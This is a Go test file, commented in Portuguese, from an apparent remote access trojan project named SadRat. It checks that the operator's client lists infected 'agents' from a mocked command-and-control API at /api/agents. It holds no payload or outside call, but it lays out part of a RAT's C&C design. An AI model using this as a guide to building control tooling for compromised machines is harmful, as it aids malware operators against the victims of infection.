package tests

import (
	"net/http"
	"net/http/httptest"
	"testing"

	// O pacote que vamos criar na Fase Verde
	"github.com/VitorDie/SadRat/internal/client"
)

func TestClientHTTP_RequestAvailableAgents(t *testing.T) {
	// 1. Mock do C&C: Fingimos ser a API real que construímos anteriormente
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// O Cliente deve bater na rota exata de listar agentes com o método GET
		if r.URL.Path != "/api/agents" || r.Method != http.MethodGet {
			t.Fatalf("O Cliente tentou acessar %s %s, mas deveria ser GET /api/agents", r.Method, r.URL.Path)
		}
		
		// O C&C falso devolve dois agentes infectados em formato JSON
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`[{"id": "agent-alfa"}, {"id": "agent-omega"}]`))
	}))
	defer mockServer.Close()

	// 2. Especificação: Instanciamos a ferramenta do Operador através da Interface e do módulo HTTP
	// (Ainda vamos criar esse pacote na Fase Verde)
	// var operador client.Client = client.NewClientHTTP(mockServer.URL)

	// Como o pacote não existe ainda para o compilador, vamos simular a chamada direta para a Fase Red falhar por falta do pacote:
	operador := client.NewClientHTTP(mockServer.URL)

	// 3. Ação: O Operador executa o comando para ver os zumbis disponíveis
	agents, err := operador.RequestAvailableAgents()
	if err != nil {
		t.Fatalf("O Cliente falhou ao listar os agentes: %v", err)
	}

	// 4. Validação: O Cliente decodificou o JSON perfeitamente?
	if len(agents) != 2 {
		t.Fatalf("Esperava ver 2 agentes na lista, mas retornou %d", len(agents))
	}

	// SUBSTITUA A PALAVRA ZERO PELO NÚMERO 0 DENTRO DOS COLCHETES ABAIXO!
	if agents[0].ID != "agent-alfa" {
		t.Errorf("Esperava que o primeiro agente fosse o 'agent-alfa', mas foi '%s'", agents[0].ID)
	}
}